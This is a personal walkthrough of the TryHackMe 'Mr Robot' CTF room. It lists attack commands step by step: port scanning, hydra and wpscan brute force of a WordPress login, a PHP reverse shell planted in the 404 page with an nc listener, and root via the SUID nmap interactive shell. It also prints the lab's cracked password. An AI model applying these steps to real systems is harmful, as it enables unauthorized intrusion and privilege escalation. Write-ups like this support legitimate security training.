# ✅ TryHackMe CTF Walkthrough: Mr Robot

This repository contains a detailed walkthrough of how I solved the **Mr Robot CTF** on TryHackMe.  
The challenge simulates a real-world penetration testing scenario with an emphasis on web application exploitation and privilege escalation.

---

## 🎯 Room Overview

The **Mr Robot CTF** is designed to teach practical offensive security skills, focusing on:

- VPN connectivity to the TryHackMe network.  
- Service enumeration and web directory busting.  
- WordPress-specific vulnerabilities.  
- Brute-forcing WordPress login credentials.  
- Using reverse shells to gain system access.  
- Hash cracking and privilege escalation using SUID binaries.  
- Root flag retrieval and post-exploitation techniques.

---

## 📚 Step-by-Step Walkthrough

1. Connect With the TryHackMe server using Command:  
   ```bash
   sudo openvpn Downloads/Ynos.ovpn
   ```

2. Confirm you can connect to the machine using the command:  
   ```bash
   ping <IP of the machine>
   ```

3. Start by scanning for open ports using Nmap:  
   ```bash
   nmap -sV -O -T5 -p- <IP of the machine> -oN nmap.results
   ```

4. Open the website of this machine and browse:  
   ```bash
   http://<IP>/robots.txt
   ```  
   Some files are revealed.

5. Start directory busting on this website.

6. Use the key `fsocity.dic` by right-clicking and selecting "Save Page As".

7. Shorten this wordlist by removing duplicate elements using the command:  
   ```bash
   cat fsocity.dic | sort | uniq > main.dic
   ```

8. From dirbuster, we found that this uses **WordPress**. Access:  
   ```bash
   http://<IP>/wp-login
   ```

9. Attempt to find login ID and password for this website using wpscan:  
   ```bash
   wpscan --url http://10.10.49.119 -eu
   ```

10. Use **Burp Suite** to analyze the request flow and prepare for brute-forcing.

11. Brute-force the username using hydra:  
    ```bash
    hydra -L main.dic -p test 10.10.49.119 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
    ```

12. Three recommended usernames found: `elliot`, `Elliot`, `ELLIOT`.

13. Tried Hydra again but no valid password found.

14. Used wpscan instead:  
    ```bash
    wpscan --url http://10.10.49.119 -U Elliot -P main.dic --password-attack wp-login -t 100 -o wpscan.results
    ```

15. Edited the 404 page of the website and added a **PHP reverse shell code** from pentestmonkey. Provided our IP for reverse connection.

16. Start listening on port 4444:  
    ```bash
    nc -nlvp 4444
    ```

17. Access the 404 page to trigger reverse shell.

18. Gain shell access.

19. Navigate to `/home/robot/` and find `password.raw-md5` containing a hashed password.

20. Crack the hash using [CrackStation](https://crackstation.net/).

21. Gain access to robot user:  
    ```bash
    su robot
    ```  
    Password:  
    ```
    abcdefghijklmnopqrstuvwxyz
    ```

22. Understand SUID-bit files in Linux are files executable with elevated (root) privileges.

23. Find SUID files:  
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```

24. Discovered nmap can be used as root.

25. Launch nmap in interactive mode:  
    ```bash
    nmap --interactive
    ```

26. Type:  
    ```bash
    sh
    ```  
    to gain a root shell.

27. Locate the last key:  
    ```bash
    /root/key-3-of-3.txt
    ```

28. CTF complete!

---

## 🎯 Skills Gained

- VPN connection for remote labs.  
- Nmap and directory busting techniques.  
- WordPress vulnerability assessment.  
- Reverse shell deployment.  
- MD5 hash extraction and cracking.  
- Privilege escalation via SUID nmap binary.

---

## ⚡ Final Outcome

- Found WordPress login.  
- Extracted usernames, cracked weak credentials.  
- Reverse shell access achieved.  
- User and root privilege escalation successfully completed.

---

## 🔗 Room Link

[Mr Robot – TryHackMe](https://tryhackme.com/room/mrrobot)

---


## 👤 Author

**Harbeer-Singh**
